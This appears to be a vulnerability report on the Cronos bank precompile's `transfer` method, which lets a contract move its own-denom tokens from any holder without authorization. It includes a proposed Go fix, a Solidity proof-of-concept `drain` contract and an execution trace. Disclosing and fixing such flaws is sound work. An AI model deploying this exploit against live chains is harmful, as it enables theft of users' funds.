### Title
Bank Precompile `transfer` Allows Any EVM Contract to Drain Arbitrary User Balances Without Authorization — (`x/cronos/keeper/precompiles/bank.go`)

---

### Summary

The `transfer` method of the `BankContract` precompile accepts an arbitrary `sender` address from calldata and executes `bankKeeper.SendCoins(from, to, ...)` without verifying that the calling contract is authorized to move tokens on behalf of `from`. Any deployed EVM contract can drain `evm/<contract>` native bank tokens from any user's account without the user's consent.

---

### Finding Description

In `x/cronos/keeper/precompiles/bank.go`, the `TransferMethodName` branch of `BankContract.Run()`:

```go
// line 175-192
sender := args[0].(common.Address)   // ← arbitrary address from calldata
recipient := args[1].(common.Address)
amount := args[2].(*big.Int)
...
from := sdk.AccAddress(sender.Bytes())
to   := sdk.AccAddress(recipient.Bytes())
...
denom := EVMDenom(contract.Caller())  // "evm/<calling_contract>"
amt   := sdk.NewCoin(denom, sdkmath.NewIntFromBigInt(amount))
err = stateDB.ExecuteNativeAction(precompileAddr, nil, func(ctx sdk.Context) error {
    ...
    if err := bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt)); err != nil {
```

The `from` address is taken directly from calldata. The denom is namespaced to the calling contract (`evm/<contract.Caller()>`), but there is **no check** that `contract.Caller()` is authorized to move tokens on behalf of `sender`. The `mint` method (lines 136–142) allows any contract to mint `evm/<itself>` tokens to any address. Once users hold those tokens, the same contract can call `transfer(victim, attacker, balance)` to drain them unconditionally.

The `mint` path is correctly scoped — only the calling contract can mint its own-denom tokens. The `transfer` path breaks this invariant by letting the calling contract move those tokens out of **any** holder's account without their approval.

---

### Impact Explanation

**Critical — Unauthorized transfer of `evm/<contract>` bank-module assets from any user's account.**

`evm/<contract>` tokens are first-class native bank module coins. They can be held in user wallets, used as collateral in DeFi protocols, and bridged. A malicious (or compromised) contract can:

1. Mint `evm/<itself>` tokens to users (legitimate use, e.g., a DeFi protocol distributing rewards).
2. At any later time, call `transfer(victim, attacker, victimBalance)` on the bank precompile to drain every holder's balance in a single transaction — with no approval, no warning, and no recourse.

There is no `revokeApproval` equivalent; users cannot protect themselves once they hold the tokens.

---

### Likelihood Explanation

**High.** The attacker path requires only:

1. Deploying an EVM contract (permissionless on Cronos).
2. Having users hold `evm/<contract>` tokens — either by minting them directly or by being a legitimate token issuer whose private key is later compromised.

No admin, governance, or validator access is needed. The precompile is reachable by any EVM transaction.

---

### Recommendation

In the `TransferMethodName` branch, enforce that the calling contract is only permitted to move tokens **from itself** (i.e., `contract.Caller() == sender`), or implement an on-chain allowance mechanism (analogous to ERC-20 `approve`/`transferFrom`) so that token holders must explicitly authorize a contract to spend on their behalf before `SendCoins` is called.

```go
// Proposed guard in the transfer case
if contract.Caller() != sender {
    return nil, errors.New("caller is not authorized to transfer on behalf of sender")
}
```

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBankPrecompile {
    function mint(address recipient, uint256 amount) external returns (bool);
    function transfer(address sender, address recipient, uint256 amount) external returns (bool);
}

contract BankPrecompileExploit {
    IBankPrecompile constant BANK = IBankPrecompile(0x0000000000000000000000000000000000000064);

    // Step 1 (legitimate): issue evm/<this> tokens to users
    function issueTokens(address user, uint256 amount) external {
        BANK.mint(user, amount);
    }

    // Step 2 (exploit): drain any holder's balance without their consent
    function drain(address victim, address attacker, uint256 amount) external {
        // No approval from `victim` required — succeeds unconditionally
        bool ok = BANK.transfer(victim, attacker, amount);
        require(ok, "drain failed");
    }
}
```

**Execution trace:**

1. Attacker deploys `BankPrecompileExploit` at address `0xEXPL`.
2. Calls `issueTokens(victim, 1_000e18)` → victim now holds `1000 evm/0xEXPL` in the bank module.
3. Calls `drain(victim, attacker, 1_000e18)` → `bankKeeper.SendCoins(victim, attacker, [{denom:"evm/0xEXPL", amount:1000e18}])` executes with no authorization check.
4. Victim's entire balance is transferred to the attacker.
